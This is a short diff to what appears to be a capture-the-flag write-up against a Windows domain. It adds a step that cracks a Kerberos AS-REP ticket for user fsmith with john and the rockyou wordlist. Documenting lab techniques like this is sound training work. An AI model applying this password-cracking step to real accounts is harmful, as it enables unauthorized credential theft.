@@ -152,7 +152,11 @@ fsmith@egotistical-bank.local
 ```
 ![image](https://user-images.githubusercontent.com/83878909/232200855-613b961b-3a89-4a3c-b2ed-6f3fa3aa124f.png)
 
-
+### Crack TGT
+  - Crack the `TGT` obtained for the user `fsmith` to get the password.
+```CSS
+▶ john --format:krb5asrep ticket.hrb5 /usr/share/wordlists/rockyou.txt
+```
 ---
 
 
